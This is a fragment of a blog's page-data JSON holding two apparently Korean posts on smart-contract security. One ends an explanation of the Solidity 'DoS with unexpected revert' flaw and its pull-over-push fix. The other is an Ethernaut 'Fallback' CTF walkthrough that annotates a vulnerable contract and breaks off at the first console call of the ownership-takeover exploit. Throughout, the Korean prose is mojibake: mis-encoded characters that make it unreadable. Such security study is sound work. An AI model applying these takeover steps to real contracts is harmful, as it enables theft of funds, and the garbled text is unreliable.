class=\"token punctuation\">}</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n</code></pre></div>\n<p><span style=\"color:grey\">ì¶œì²˜: <a href=\"https://solidity-by-example.org/hacks/denial-of-service/\">https://solidity-by-example.org/hacks/denial-of-service/</a></span></p>\n<p>ì‹œë‚˜ë¦¬ì˜¤ëŠ” ì´ë ‡ë‹¤.</p>\n<ol>\n<li>KingOfEther of Ether Contractê°€ ë°°í¬ëœë‹¤.</li>\n<li>ì²˜ìŒìœ¼ë¡œ Aê°€ 1 Etherë¥¼ claimThrone()ì— ë³´ëƒ„ìœ¼ë¡œì¨ Kingì´ ëœë‹¤.</li>\n<li>ë‹¤ìŒìœ¼ë¡œ Bê°€ 2 Etherë¥¼ claimThrone()ì— ë³´ëƒ„ìœ¼ë¡œì¨ Bê°€ Kingìœ¼ë¡œ ë°”ë€ë‹¤. Kingì´ ë°”ë€Œê¸° ì „ì— Aì—ê²Œ 1 Etherë¥¼ refund í•´ì¤€ë‹¤.</li>\n<li>Cê°€ KingOfEtherì˜ ì£¼ì†Œì™€ í•¨ê»˜ Attack contractë¥¼ ë°°í¬í•œë‹¤.</li>\n<li>CëŠ” Attack.attackì„ 3 Etherì™€ í•¨ê¼ í˜¸ì¶œí•œë‹¤.</li>\n<li>CëŠ” CëŠ” kingì´ ë˜ê³  Attack contractëŠ” etherë¥¼ ë°›ì„ ìˆ˜ ì—†ê¸° ë•Œë¬¸ì— ë‹¤ë¥¸ ëˆ„êµ¬ë„ kingì´ ë  ìˆ˜ ì—†ê²Œ ëœë‹¤. ì¦‰ KingOfEhterì€ ë¬´ì˜ë¯¸í•œ contractê°€ ëœë‹¤.</li>\n</ol>\n<p>EVMì´ externally owned accountsì™€ contract accountsë¥¼ êµ¬ë¶„í•˜ì§€ ì•ŠëŠ”ë‹¤ëŠ” ì ì„ ì•…ìš©í•œ ê²ƒ ê°™ì•„ë³´ì¸ë‹¤.</p>\n<hr>\n<h2 id=\"how-to-prevent\" style=\"position:relative;\"><a href=\"#how-to-prevent\" aria-label=\"how to prevent permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>How to prevent?</h2>\n<h4 id=\"pull-over-push\" style=\"position:relative;\"><a href=\"#pull-over-push\" aria-label=\"pull over push permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><strong>pull over push</strong></h4>\n<p>pull over pushë¥¼ í†µí•´ ë¬¸ì œë¥¼ í•´ê²° í•  ìˆ˜ ìˆë‹¤. pull over pushëŠ” contractë¥¼ ë¶„ë¦¬í•¨ìœ¼ë¡œì¨ attackerì˜ ê³µê²©ì„ attackerì˜ ì†ì‹¤ë¡œë§Œ ì²˜ë¦¬ í•  ìˆ˜ ìˆë‹¤. ìœ„ì˜ ì½”ë“œë¥¼ pull over pushë¡œ ë°”ê¾¸ì–´ë³´ì•˜ë‹¤.</p>\n<div class=\"gatsby-highlight\" data-language=\"solidity\"><pre class=\"language-solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">contract</span> <span class=\"token class-name\">KingOfEther</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token builtin\">address</span> <span class=\"token keyword\">public</span> king<span class=\"token punctuation\">;</span>\n    <span class=\"token builtin\">uint</span> <span class=\"token keyword\">public</span> balance<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">mapping</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> <span class=\"token operator\">=></span> <span class=\"token builtin\">uint</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> balances<span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">claimThrone</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token keyword\">payable</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>value <span class=\"token operator\">></span> balance<span class=\"token punctuation\">,</span> <span class=\"token string\">\"Need to pay more to become the king\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        balances<span class=\"token punctuation\">[</span>king<span class=\"token punctuation\">]</span> <span class=\"token operator\">+=</span> balance<span class=\"token punctuation\">;</span>\n\n        balance <span class=\"token operator\">=</span> msg<span class=\"token punctuation\">.</span>value<span class=\"token punctuation\">;</span>\n        king <span class=\"token operator\">=</span> msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">withdraw</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender <span class=\"token operator\">!=</span> king<span class=\"token punctuation\">,</span> <span class=\"token string\">\"Current king cannot withdraw\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token builtin\">uint</span> amount <span class=\"token operator\">=</span> balances<span class=\"token punctuation\">[</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n        balances<span class=\"token punctuation\">[</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token punctuation\">(</span><span class=\"token builtin\">bool</span> sent<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">.</span>call<span class=\"token punctuation\">{</span>value<span class=\"token punctuation\">:</span> amount<span class=\"token punctuation\">}</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>sent<span class=\"token punctuation\">,</span> <span class=\"token string\">\"Failed to send Ether\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n\nì´ ì½”ë“œëŠ” Example ì½”ë“œì˜ <span class=\"token function\">claimThrone</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">function</span>ì´ <span class=\"token number\">2</span>ê°œì˜ <span class=\"token keyword\">function</span>ìœ¼ë¡œ ë‚˜ëˆ„ì–´ ì§„ ê²ƒì„ ë³¼ ìˆ˜ ìˆë‹¤<span class=\"token punctuation\">.</span> ìœ„ ì½”ë“œì˜ <span class=\"token function\">claimThrone</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>ëŠ” kingì„ ë°”ê¾¸ëŠ” ìš©ë„ë¡œë§Œ ì‚¬ìš©ëœë‹¤<span class=\"token punctuation\">.</span> ê·¸ë¦¬ê³  kingì—ì„œ ì«’ê²¨ë‚œ ì‚¬ëŒë“¤ì€ withdraw í•¨ìˆ˜ë¥¼ í†µí•´ etherë¥¼ ë‹¤ì‹œ ê°€ì ¸ì˜¬ ìˆ˜ ìˆë‹¤<span class=\"token punctuation\">.</span>\n</code></pre></div>\n<h2 id=\"ë§ˆë¬´ë¦¬\" style=\"position:relative;\"><a href=\"#%EB%A7%88%EB%AC%B4%EB%A6%AC\" aria-label=\"ë§ˆë¬´ë¦¬ permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>ë§ˆë¬´ë¦¬</h2>\n<p>ì·¨ì•½ì ë“¤ì— ëŒ€í•´ì„œ ê³µë¶€í•˜ë©´ì„œ ë‚˜ëŠ” EVMì— ëŒ€í•´ì„œ ì•Œì•„ê°€ì•¼ í•  ë¶€ë¶„ì´ ë§ë‹¤ëŠ” ìƒê°ì´ ë“ ë‹¤. <del>ì˜ì•ˆë‹¤ê³  ìƒê°í–ˆëŠ”ë°ã…‹ã…‹</del> ê°ˆ ê¸¸ì´ ë©€ë‹¤!! ê¾¸ì¤€íˆ ê³µë¶€í•˜ì:)</p>\n<hr>\n<h3 id=\"reference\" style=\"position:relative;\"><a href=\"#reference\" aria-label=\"reference permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Reference</h3>\n<ul>\n<li><a href=\"https://consensys.github.io/smart-contract-best-practices/known_attacks/#dos-with-unexpected-revert\">https://consensys.github.io/smart-contract-best-practices/known_attacks/#dos-with-unexpected-revert</a></li>\n<li><a href=\"https://solidity-by-example.org/hacks/denial-of-service/\">https://solidity-by-example.org/hacks/denial-of-service/</a></li>\n<li><a href=\"https://consensys.github.io/smart-contract-best-practices/recommendations/#favor-pull-over-push-for-external-calls\">https://consensys.github.io/smart-contract-best-practices/recommendations/#favor-pull-over-push-for-external-calls</a></li>\n<li><a href=\"https://arxiv.org/pdf/2105.02852.pdf\">https://arxiv.org/pdf/2105.02852.pdf</a></li>\n</ul>\n<div class=\"table-of-contents\">\n<ul>\n<li>\n<p><a href=\"#unexpected-revert%EB%9E%80\">Unexpected Revertë€?</a></p>\n</li>\n<li>\n<p><a href=\"#example-code\">Example code</a></p>\n</li>\n<li>\n<p><a href=\"#how-to-prevent\">How to prevent?</a></p>\n<ul>\n<li>\n<ul>\n<li><a href=\"#pull-over-push\"><strong>pull over push</strong></a></li>\n</ul>\n</li>\n</ul>\n</li>\n<li>\n<p><a href=\"#%EB%A7%88%EB%AC%B4%EB%A6%AC\">ë§ˆë¬´ë¦¬</a></p>\n<ul>\n<li><a href=\"#reference\">Reference</a></li>\n</ul>\n</li>\n</ul>\n</div>","frontmatter":{"date":"December 29, 2021","title":"(ì·¨ì•½ì  ì‹œë¦¬ì¦ˆ 6) DOS With Unexpected Revert","categories":"ì·¨ì•½ì ë¶„ì„","author":"í•œì„±ì›","emoji":"ğŸ§¢"},"fields":{"slug":"/vulnerability/dos_with_unexpected_revert/dos_unexpected_revert/"}},"prev":{"id":"650ebf86-b5f5-56e0-8802-3f609ad7e83c","html":"<h1 id=\"-1-fallback\" style=\"position:relative;\"><a href=\"#-1-fallback\" aria-label=\" 1 fallback permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>ğŸ‘‹ 1. Fallback</h1>\n<p><strong>Difficulty 1/10</strong></p>\n<p>ì§ì ‘ í‘¼ Ethernauts í’€ì´ë¥¼ ì ì–´ë³´ë ¤ê³  í•œë‹¤. ì·¨ì•½ì ì— ê³µë¶€í–ˆë˜ ì·¨ì•½ì ì„ ì‹¤ì œë¡œ ê³µê²©í•´ë³´ë©° ë³µìŠµ ë° ì‹¤ìŠµì„ í•´ë³¼ìˆ˜ ìˆì–´ ì¢‹ì€ ê²ƒ ê°™ë‹¤.</p>\n<ul>\n<li>ìŠ¹ë¦¬ ì¡°ê±´</li>\n<li>ì½”ë“œ ë¶„ì„</li>\n<li>í’€ì´</li>\n</ul>\n<p>ìˆœì„œë¡œ ì§„í–‰ ë  ê²ƒì´ë‹¤.</p>\n<hr>\n<h2 id=\"ìŠ¹ë¦¬-ì¡°ê±´\" style=\"position:relative;\"><a href=\"#%EC%8A%B9%EB%A6%AC-%EC%A1%B0%EA%B1%B4\" aria-label=\"ìŠ¹ë¦¬ ì¡°ê±´ permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>ìŠ¹ë¦¬ ì¡°ê±´</h2>\n<ul>\n<li>contractì˜ ownershipì„ ëºì–´ì˜¤ê¸°</li>\n<li>contractì˜ balanceë¥¼ 0ìœ¼ë¡œ ë§Œë“¤ê¸°</li>\n</ul>\n<hr>\n<h2 id=\"ì½”ë“œ-ë¶„ì„\" style=\"position:relative;\"><a href=\"#%EC%BD%94%EB%93%9C-%EB%B6%84%EC%84%9D\" aria-label=\"ì½”ë“œ ë¶„ì„ permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>ì½”ë“œ ë¶„ì„</h2>\n<p>ë¶„ì„ì€ ì£¼ì„ì—!</p>\n<div class=\"gatsby-highlight\" data-language=\"solidity\"><pre class=\"language-solidity\"><code class=\"language-solidity\"><span class=\"token comment\">// SPDX-License-Identifier: MIT</span>\n<span class=\"token keyword\">pragma</span> <span class=\"token keyword\">solidity</span> <span class=\"token operator\">^</span><span class=\"token version number\">0.6.0</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">import</span> <span class=\"token string\">'@openzeppelin/contracts/math/SafeMath.sol'</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">Fallback</span> <span class=\"token punctuation\">{</span>\n\n    <span class=\"token keyword\">using</span> <span class=\"token class-name\">SafeMath</span> <span class=\"token keyword\">for</span> <span class=\"token builtin\">uint256</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token comment\">// ê°ê°ì˜ addressë‹¹ ether ê¸°ì—¬ë„(contribution)</span>\n    <span class=\"token keyword\">mapping</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> <span class=\"token operator\">=></span> <span class=\"token builtin\">uint</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> contributions<span class=\"token punctuation\">;</span>\n\n    <span class=\"token comment\">// Fallback Contractì˜ owner address</span>\n    <span class=\"token builtin\">address</span> <span class=\"token keyword\">payable</span> <span class=\"token keyword\">public</span> owner<span class=\"token punctuation\">;</span>\n\n    <span class=\"token comment\">//constructor</span>\n    <span class=\"token keyword\">constructor</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token comment\">// Deployerë¥¼ ownerë¡œ ì„¤ì •</span>\n        owner <span class=\"token operator\">=</span> msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">;</span>\n\n        <span class=\"token comment\">// Deployerì˜ ê¸°ì—¬ë„ë¥¼ 1000 etherë¡œ ì„¤ì •</span>\n        contributions<span class=\"token punctuation\">[</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">1000</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span><span class=\"token number\">1</span> ether<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token comment\">//Ownerë§Œ ì‚¬ìš©í•  ìˆ˜ ìˆê²Œí•˜ëŠ” modifier</span>\n    <span class=\"token keyword\">modifier</span> onlyOwner <span class=\"token punctuation\">{</span>\n            <span class=\"token comment\">// msg.senderê°€ ownerì¸ì§€ ì•„ë‹Œì§€ í™•ì¸</span>\n            <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>\n                msg<span class=\"token punctuation\">.</span>sender <span class=\"token operator\">==</span> owner<span class=\"token punctuation\">,</span>\n                <span class=\"token string\">\"caller is not the owner\"</span>\n            <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">_</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span>\n\n    <span class=\"token comment\">//contractì˜ ê¸°ì—¬ë„ë¥¼ ì˜¬ë¦´ ìˆ˜ ìˆëŠ” functionì´ë‹¤.</span>\n    <span class=\"token comment\">//payableë¡œ ì„ ì–¸ë˜ì–´ etherë¥¼ ì „ì†¡í•˜ê³  ë°›ì„ ìˆ˜ ìˆë‹¤.</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">contribute</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">payable</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token comment\">//msg.senderê°€ ë³´ë‚¸ etherì˜ ì–‘ì´ 0.001 ì´í•˜ì¸ì§€ í™•ì¸</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>value <span class=\"token operator\">&lt;</span> <span class=\"token number\">0.001</span> ether<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token comment\">//msg.senderì˜ ê¸°ì—¬ë„(contributions)ë¥¼ msg.valueë§Œí¼ ì˜¬ë¦°ë‹¤.</span>\n        contributions<span class=\"token punctuation\">[</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">]</span> <span class=\"token operator\">+=</span> msg<span class=\"token punctuation\">.</span>value<span class=\"token punctuation\">;</span>\n\n        <span class=\"token comment\">//ë§Œì•½ msg.senderì˜ contributionsê°€ ownerì˜ contributionsë³´ë‹¤ í¬ë‹¤ë©´ ownershipì´ transferëœë‹¤.</span>\n        <span class=\"token comment\">//ì´ˆê¸°ì— ownerì˜ contributionsì€ 1000 etherì´ê¸° ë•Œë¬¸ì— ownershipì„ ë°”ê¾¸ê¸° ìœ„í•´ì„œëŠ” 1000 etherì´ìƒì˜ ê¸°ì—¬í•´ì•¼í•œë‹¤.</span>\n        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>contributions<span class=\"token punctuation\">[</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">]</span> <span class=\"token operator\">></span> contributions<span class=\"token punctuation\">[</span>owner<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        owner <span class=\"token operator\">=</span> msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token comment\">//ê¸°ì—¬ë„ë¥¼ í™•ì¸í•  ìˆ˜ ìˆëŠ” view function</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">getContribution</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">view</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token comment\">//msg.senderì˜ ê¸°ì—¬ë„ë¥¼ return í•œë‹¤.</span>\n        <span class=\"token keyword\">return</span> contributions<span class=\"token punctuation\">[</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token comment\">//contractê°€ ê°€ì§€ê³  ìˆëŠ” ëª¨ë“  balance(ether)ë¥¼ ownerì—ê²Œ ì „ì†¡í•œë‹¤.</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">withdraw</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> onlyOwner <span class=\"token punctuation\">{</span>\n        owner<span class=\"token punctuation\">.</span><span class=\"token function\">transfer</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>balance<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token comment\">//payableë¡œ ì„ ì–¸ë˜ì–´ etherë¥¼ ì „ì†¡í•˜ê³  ë°›ì„ ìˆ˜ ìˆë‹¤.</span>\n    <span class=\"token comment\">//receive function</span>\n    <span class=\"token function\">receive</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token keyword\">payable</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token comment\">//msg.senderì˜ msg.valueê°€ 0ë³´ë‹¤ í¬ê³  ê¸°ì—¬ë„(contributions)ê°€ 0ë³´ë‹¤ í°ì§€ í™•ì¸í•œë‹¤</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>value <span class=\"token operator\">></span> <span class=\"token number\">0</span> <span class=\"token operator\">&amp;&amp;</span> contributions<span class=\"token punctuation\">[</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">]</span> <span class=\"token operator\">></span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token comment\">//ownerë¥¼ msg.senderë¡œ ë°”ê¾¼ë‹¤.</span>\n        owner <span class=\"token operator\">=</span> msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span></code></pre></div>\n<hr>\n<h2 id=\"í’€ì´\" style=\"position:relative;\"><a href=\"#%ED%92%80%EC%9D%B4\" aria-label=\"í’€ì´ permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>í’€ì´</h2>\n<p>ìš°ë¦¬ëŠ” 2ê°€ì§€ì˜ ë¬¸ì œë¥¼ í’€ì–´ì•¼ í•œë‹¤.</p>\n<ol>\n<li>contractì˜ ownershipì„ ëºì–´ì˜¤ê¸°</li>\n<li>contractì˜ balanceë¥¼ 0ìœ¼ë¡œ ë§Œë“¤ê¸°</li>\n</ol>\n<p>ì°¨ë¡€ì°¨ë¡€ í’€ì–´ë³´ê² ë‹¤.\nì½”ë“œë¥¼ ë´¤ì„ ë–„ contractì˜ ownershipì„ ê°€ì ¸ì˜¬ ìˆ˜ ìˆëŠ” ë°©ë²•ì€ 2ê°€ì§€ê°€ ìˆë‹¤.</p>\n<ul>\n<li>contribute()</li>\n<li>receive()</li>\n</ul>\n<ol>\n<li>contribute()ë¥¼ ì´ìš©í•´ ownerê°€ ë˜ë ¤ë©´ ì´ˆê¸° ownerì˜ contributions 1000 etherë³´ë‹¤ ë” í° ëˆì„ contractë¡œ ë³´ë‚´ì•¼ í•œë‹¤.</li>\n<li>í•˜ì§€ë§Œ contribute()ì˜ requireì„ ë³´ë©´ í•œë²ˆì— 0.001 etherì´í•˜ì˜ etherë§Œ ë³´ë‚¼ ìˆ˜ ìˆê²Œ ë˜ì–´ìˆë‹¤. contractì—ì„œ ì˜ë„í•œëŒ€ë¡œ ownerê°€ ë˜ë ¤ë©´ <strong>1,000,000 + a</strong> ë²ˆ ì „ì†¡í•´ì•¼í•œë‹¤.</li>\n<li>ì´ ë°©ë²•ì€ ë¹„ìš©ë„ ë§ì´ë“¤ê³  ì—„ì²­ë‚œ ì‹œê°„ì´ ê±¸ë¦¬ê¸° ë•Œë¬¸ì— receive í•¨ìˆ˜ë¥¼ í™•ì¸í•´ë³´ì!</li>\n<li>receive í•¨ìˆ˜ë¥¼ ë³´ë©´ msg.valueë‚˜ 0ë³´ë‹¤ í¬ê³  contributionsê°€ 0ë³´ë‹¤ í¬ë©´ ownerë¥¼ msg.senderë¡œ ë°”ê¿€ ìˆ˜ ìˆë‹¤.</li>\n<li>ê·¸ë ‡ë‹¤ë©´ contribute() í˜¸ì¶œí•´ ì‘ì€ ê°’ì„ ë³´ë‚´ì–´ contributionsë¥¼ 0ì„ ì´ˆê³¼í•˜ê²Œ ë§Œë“ ë‹¤ìŒ receiveí•¨ìˆ˜ë¥¼ í˜¸ì¶œí•˜ë©´ ownerë¥¼ ê°€ì ¸ì˜¬ ìˆ˜ ìˆë‹¤.</li>\n</ol>\n<p>ëª¨ë“  ì½”ë“œëŠ” consoleì°½ì—ì„œ ì´ë£¨ì–´ì§„ë‹¤.\nctrl + shift + ië¥¼ ëˆŒëŸ¬ consoleì°½ì„ í™œì„±í™” ì‹œí‚¤ì</p>\n<div class=\"gatsby-highlight\" data-language=\"javascript\"><pre class=\"language-javascript\"><code class=\"language-javascript\"><span class=\"token comment\">//0.001ë³´ë‹¤ ì‘ì€ 0.0001ì„ ë³´ë‚¸ë‹¤.</span>\n<span class=\"token keyword\">await</span> contract<span class=\"token punctuation\">.</span>contribute<span class=\"token 